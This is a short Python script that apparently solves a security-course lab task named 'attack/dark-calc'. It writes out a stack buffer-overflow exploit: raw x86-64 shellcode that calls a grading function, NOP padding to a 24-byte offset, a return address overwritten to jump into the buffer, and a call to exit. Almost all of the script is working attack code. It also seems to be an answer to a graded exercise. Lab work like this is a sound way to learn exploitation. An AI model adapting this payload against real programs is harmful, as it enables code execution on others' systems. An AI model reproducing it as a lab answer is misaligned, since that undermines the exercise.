#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload = b""

BUF = 0x721000800FD0                
TRAMPOLINE = 0x721000800FF0         
GRADE_EVAL = 0x401A87               
EXIT_PLT = 0x401880                 
OFFSET = 24                        

shellcode = b""
shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)   
shellcode += b"\x6a\x04"                                
shellcode += b"\x5f"                                   
shellcode += b"\xff\xd0"                               

shellcode += b"\xeb\x14"

payload = shellcode + b"\x90" * (OFFSET - len(shellcode))   
payload += struct.pack("<Q", BUF)       

payload += b"\xbf" + struct.pack("<I", 0)              
payload += b"\xb8" + struct.pack("<I", EXIT_PLT)       
payload += b"\xff\xd0"                                 

sys.stdout.buffer.write(payload)